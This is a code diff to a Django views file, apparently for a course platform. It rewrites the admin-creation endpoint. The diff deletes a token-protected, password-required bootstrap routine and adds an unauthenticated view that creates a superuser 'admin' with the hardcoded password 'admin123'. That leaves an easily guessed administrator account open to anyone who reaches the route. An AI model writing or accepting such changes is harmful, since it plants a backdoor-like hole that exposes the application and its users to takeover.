@@ -89,49 +89,16 @@ def login_user(request):
         status=401
     )
 
-@api_view(['POST'])
 def create_admin(request):
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser(
+            'admin',
+            'admin@gmail.com',
+            'admin123'
+        )
+        return HttpResponse("Admin created")
 
-    expected_token = os.environ.get("ADMIN_BOOTSTRAP_TOKEN")
-    provided_token = request.headers.get("X-Admin-Bootstrap-Token")
-
-    if not expected_token or provided_token != expected_token:
-
-        return Response({
-            "error": "Admin bootstrap is disabled or token is invalid"
-        }, status=403)
-
-    username = request.data.get("username", "admin")
-    email = request.data.get("email", "admin@gmail.com")
-    password = request.data.get("password")
-
-    if not password:
-
-        return Response({
-            "error": "Password is required"
-        }, status=400)
-
-    user, created = User.objects.get_or_create(
-        username=username,
-        defaults={
-            "email": email,
-            "role": "super_admin",
-            "is_staff": True,
-            "is_superuser": True,
-        }
-    )
-
-    user.email = email
-    user.role = "super_admin"
-    user.is_staff = True
-    user.is_superuser = True
-    user.set_password(password)
-    user.save()
-
-    return Response({
-        "message": "Admin created" if created else "Admin password reset",
-        "username": user.username,
-    })
+    return HttpResponse("Admin already exists")
 # =========================
 # GET COURSES
 # =========================
